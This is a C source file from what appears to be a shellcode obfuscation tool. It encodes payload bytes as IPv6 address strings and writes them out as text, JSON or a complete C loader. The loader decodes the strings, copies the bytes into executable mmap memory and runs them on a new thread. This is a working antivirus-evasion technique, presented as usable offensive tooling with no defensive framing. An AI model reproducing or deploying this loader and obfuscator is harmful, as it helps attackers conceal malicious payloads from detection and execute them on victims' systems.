#include "ipv6fuscation.h"

static uint32_t generate_ipv6_hex(int a, int b, int c, int d) {
    return ((uint32_t)a << 24) | ((uint32_t)b << 16) | (c << 8) | d;
}

static void format_ipv6_address(uint32_t ip1, uint32_t ip2, uint32_t ip3, uint32_t ip4, 
                                char* output, size_t output_size) {
    unsigned char bytes[16];
    
    for (int i = 0; i < 4; i++) {
        bytes[i] = (ip1 >> (24 - i*8)) & 0xFF;
        bytes[4 + i] = (ip2 >> (24 - i*8)) & 0xFF;
        bytes[8 + i] = (ip3 >> (24 - i*8)) & 0xFF;
        bytes[12 + i] = (ip4 >> (24 - i*8)) & 0xFF;
    }
    
    snprintf(output, output_size,
             "%02X%02X:%02X%02X:%02X%02X:%02X%02X:%02X%02X:%02X%02X:%02X%02X:%02X%02X",
             bytes[0], bytes[1], bytes[2], bytes[3],
             bytes[4], bytes[5], bytes[6], bytes[7],
             bytes[8], bytes[9], bytes[10], bytes[11],
             bytes[12], bytes[13], bytes[14], bytes[15]);
}

bool generate_ipv6_output(const char* output_file) {
    if (!write_shellcode_file(output_file)) {
        return false;
    }
    
    FILE* f = g_payload.output_file;
    
    fprintf(f, "#include <stdio.h>\n");
    fprintf(f, "#include <stdlib.h>\n");
    fprintf(f, "#include <string.h>\n");
    fprintf(f, "#include <sys/mman.h>\n");
    fprintf(f, "#include <unistd.h>\n");
    fprintf(f, "#include <arpa/inet.h>\n");
    fprintf(f, "#include <pthread.h>\n\n");
    
    fprintf(f, "\n");
    fprintf(f, "int decode_ipv6_fuscation(const char* ipv6[], unsigned char* output, int count) {\n");
    fprintf(f, "    struct in6_addr addr;\n");
    fprintf(f, "    int offset = 0;\n\n");
    fprintf(f, "    for (int i = 0; i < count; i++) {\n");
    fprintf(f, "        if (inet_pton(AF_INET6, ipv6[i], &addr) != 1) {\n");
    fprintf(f, "            fprintf(stderr, \"Failed to convert: %%s\\n\", ipv6[i]);\n");
    fprintf(f, "            return -1;\n");
    fprintf(f, "        }\n");
    fprintf(f, "        memcpy(output + offset, &addr, 16);\n");
    fprintf(f, "        offset += 16;\n");
    fprintf(f, "    }\n");
    fprintf(f, "    return 0;\n");
    fprintf(f, "}\n\n");
    
    fprintf(f, "const char* IPv6Shell[] = {\n    ");
    
    int count = 0;
    char ipv6_str[64];
    
    for (size_t i = 0; i < g_payload.final_size; i += 16) {
        if (i + 15 < g_payload.final_size) {
            uint32_t ip1 = generate_ipv6_hex(
                g_payload.p_new_shell[i],
                g_payload.p_new_shell[i + 1],
                g_payload.p_new_shell[i + 2],
                g_payload.p_new_shell[i + 3]
            );
            
            uint32_t ip2 = generate_ipv6_hex(
                g_payload.p_new_shell[i + 4],
                g_payload.p_new_shell[i + 5],
                g_payload.p_new_shell[i + 6],
                g_payload.p_new_shell[i + 7]
            );
            
            uint32_t ip3 = generate_ipv6_hex(
                g_payload.p_new_shell[i + 8],
                g_payload.p_new_shell[i + 9],
                g_payload.p_new_shell[i + 10],
                g_payload.p_new_shell[i + 11]
            );
            
            uint32_t ip4 = generate_ipv6_hex(
                g_payload.p_new_shell[i + 12],
                g_payload.p_new_shell[i + 13],
                g_payload.p_new_shell[i + 14],
                g_payload.p_new_shell[i + 15]
            );
            
            format_ipv6_address(ip1, ip2, ip3, ip4, ipv6_str, sizeof(ipv6_str));
            
            if (i + 16 >= g_payload.final_size) {
                fprintf(f, "\"%s\"", ipv6_str);
            } else {
                fprintf(f, "\"%s\", ", ipv6_str);
            }
            
            count++;
            
            if (count % 4 == 0) {
                fprintf(f, "\n    ");
            }
        }
    }
    
    fprintf(f, "\n};\n\n");
    fprintf(f, "#define ELEMENTS_COUNT %d\n", count);
    fprintf(f, "#define SHELLCODE_SIZE %zu\n\n", g_payload.final_size);
    
    fprintf(f, "int main() {\n");
    fprintf(f, "    unsigned char shellcode[SHELLCODE_SIZE];\n");
    fprintf(f, "    void* exec_mem;\n");
    fprintf(f, "    pthread_t thread;\n\n");
    fprintf(f, "    printf(\"[*] Decoding IPv6 shellcode...\\n\");\n");
    fprintf(f, "    if (decode_ipv6_fuscation(IPv6Shell, shellcode, ELEMENTS_COUNT) != 0) {\n");
    fprintf(f, "        return -1;\n");
    fprintf(f, "    }\n\n");
    fprintf(f, "    exec_mem = mmap(NULL, SHELLCODE_SIZE,\n");
    fprintf(f, "                    PROT_READ | PROT_WRITE | PROT_EXEC,\n");
    fprintf(f, "                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\n");
    fprintf(f, "    if (exec_mem == MAP_FAILED) {\n");
    fprintf(f, "        perror(\"mmap failed\");\n");
    fprintf(f, "        return -1;\n");
    fprintf(f, "    }\n\n");
    fprintf(f, "    memcpy(exec_mem, shellcode, SHELLCODE_SIZE);\n");
    fprintf(f, "    printf(\"[+] Shellcode at: %%p\\n\", exec_mem);\n\n");
    fprintf(f, "    pthread_create(&thread, NULL, (void*(*)(void*))exec_mem, NULL);\n");
    fprintf(f, "    printf(\"[+] Press Enter to exit...\\n\");\n");
    fprintf(f, "    getchar();\n\n");
    fprintf(f, "    munmap(exec_mem, SHELLCODE_SIZE);\n");
    fprintf(f, "    return 0;\n");
    fprintf(f, "}\n");
    
    fclose(f);
    printf("[+] IPv6 output written to %s\n", output_file);
    return true;
}

bool generate_ipv6_text_output(const char* output_file) {
    if (!write_shellcode_file(output_file)) {
        return false;
    }

    FILE* f = g_payload.output_file;
    fprintf(f, "const char* IPv6Shell[] = {\n    ");

    int count = 0;
    char ipv6_str[64];

    for (size_t i = 0; i < g_payload.final_size; i += 16) {
        if (i + 15 < g_payload.final_size) {
            uint32_t ip1 = generate_ipv6_hex(
                g_payload.p_new_shell[i],
                g_payload.p_new_shell[i + 1],
                g_payload.p_new_shell[i + 2],
                g_payload.p_new_shell[i + 3]
            );

            uint32_t ip2 = generate_ipv6_hex(
                g_payload.p_new_shell[i + 4],
                g_payload.p_new_shell[i + 5],
                g_payload.p_new_shell[i + 6],
                g_payload.p_new_shell[i + 7]
            );

            uint32_t ip3 = generate_ipv6_hex(
                g_payload.p_new_shell[i + 8],
                g_payload.p_new_shell[i + 9],
                g_payload.p_new_shell[i + 10],
                g_payload.p_new_shell[i + 11]
            );

            uint32_t ip4 = generate_ipv6_hex(
                g_payload.p_new_shell[i + 12],
                g_payload.p_new_shell[i + 13],
                g_payload.p_new_shell[i + 14],
                g_payload.p_new_shell[i + 15]
            );

            format_ipv6_address(ip1, ip2, ip3, ip4, ipv6_str, sizeof(ipv6_str));

            if (i + 16 >= g_payload.final_size) {
                fprintf(f, "\"%s\"", ipv6_str);
            } else {
                fprintf(f, "\"%s\", ", ipv6_str);
            }

            count++;
            if (count % 4 == 0) {
                fprintf(f, "\n    ");
            }
        }
    }

    fprintf(f, "\n};\n");
    fclose(f);
    printf("[+] IPv6 text output written to %s\n", output_file);
    return true;
}

bool generate_ipv6_json_output(const char* output_file) {
    if (!write_shellcode_file(output_file)) {
        return false;
    }

    FILE* f = g_payload.output_file;
    fprintf(f, "{\n");
    fprintf(f, "  \"type\": \"ipv6\",\n");
    fprintf(f, "  \"shellcode_size\": %zu,\n", g_payload.final_size);
    fprintf(f, "  \"obfuscated\": [\n    ");

    int count = 0;
    char ipv6_str[64];

    for (size_t i = 0; i < g_payload.final_size; i += 16) {
        if (i + 15 < g_payload.final_size) {
            uint32_t ip1 = generate_ipv6_hex(
                g_payload.p_new_shell[i],
                g_payload.p_new_shell[i + 1],
                g_payload.p_new_shell[i + 2],
                g_payload.p_new_shell[i + 3]
            );

            uint32_t ip2 = generate_ipv6_hex(
                g_payload.p_new_shell[i + 4],
                g_payload.p_new_shell[i + 5],
                g_payload.p_new_shell[i + 6],
                g_payload.p_new_shell[i + 7]
            );

            uint32_t ip3 = generate_ipv6_hex(
                g_payload.p_new_shell[i + 8],
                g_payload.p_new_shell[i + 9],
                g_payload.p_new_shell[i + 10],
                g_payload.p_new_shell[i + 11]
            );

            uint32_t ip4 = generate_ipv6_hex(
                g_payload.p_new_shell[i + 12],
                g_payload.p_new_shell[i + 13],
                g_payload.p_new_shell[i + 14],
                g_payload.p_new_shell[i + 15]
            );

            format_ipv6_address(ip1, ip2, ip3, ip4, ipv6_str, sizeof(ipv6_str));

            if (i + 16 >= g_payload.final_size) {
                fprintf(f, "\"%s\"", ipv6_str);
            } else {
                fprintf(f, "\"%s\", ", ipv6_str);
            }

            count++;
            if (count % 4 == 0) {
                fprintf(f, "\n    ");
            }
        }
    }

    fprintf(f, "\n  ],\n");
    fprintf(f, "  \"elements_count\": %d\n", count);
    fprintf(f, "}\n");
    fclose(f);
    printf("[+] IPv6 JSON output written to %s\n", output_file);
    return true;
}
